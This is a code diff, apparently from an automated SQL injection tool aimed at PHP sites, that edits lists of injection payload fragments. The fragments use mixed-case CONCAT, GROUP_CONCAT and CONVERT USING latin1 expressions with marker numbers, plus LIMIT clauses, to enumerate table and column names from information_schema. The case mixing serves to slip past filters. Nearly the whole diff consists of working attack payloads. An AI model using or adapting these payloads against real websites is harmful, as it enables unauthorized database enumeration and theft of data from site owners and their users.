@@ -52,37 +52,21 @@ define_user_detection_query_php = [
 ]
 
 define_get_tables_name_query_php = [
-    " CoNcaT(QUOTE(2134115356), grOuP_conCat(TABLE_NAME), QUOTE(62134115356))"
+    " CoNcaT(QUOTE(2134115356), ConVert(TABLE_NAME+USing+LatiN1), QUOTE(62134115356))"
 ]
 
-define_end_string_group_concat_query_php = [
-    " FROm iNforMation_sCheMa.TabLes wHeRe tAblE_scHeMa=dATabAse()"
+define_end_query_of_tables_name_php = [
+    " FROm iNforMation_sCheMa.TabLes wHeRe tAblE_scHeMa=dATabAse() + limit "
 ]
 
 define_get_columns_of_table_query_php = [
-    " CoNcaT(QUOTE(2134115356), grOuP_conCat(ColumN_NAME), QUOTE(62134115356))"
+    " CoNcaT(QUOTE(2134115356), grOuP_conCat(ColumN_NAME+USING+LAtin1), QUOTE(62134115356))"
 ]
 
 define_end_string_columns_of_table_query_php = [
     " FROm iNforMation_sCheMa.COLUmns wHeRe tAblE_NamE="
 ]
 
-define_get_data_of_column_query_php = [
-    " CoNcaT(QUOTE(2134115356), grOuP_conCat(xcolumn), QUOTE(62134115356))"
-]
-
-define_convert_query_php = [
-    " CoNcaT(QUOTE(2134115356), conVeRt(TABLE_NAME+uSing+lAtin1), QUOTE(62134115356))"
-]
-
-define_end_convert_query_php = [
-    " FROm iNforMation_sCheMa.TabLes wHeRe tAblE_scHeMa=dATabAse() + limit "
-]
-
 define_get_columns_of_table_convert_query_php = [
     " CoNcaT(QUOTE(2134115356), cOnVert(ColumN_NAME+uSing+lAtin1), QUOTE(62134115356))"
-]
-
-define_end_columns_of_table_convert_query_php = [
-    " FROm iNforMation_sCheMa.COLUmns wHeRe tAblE_NaME="
 ]
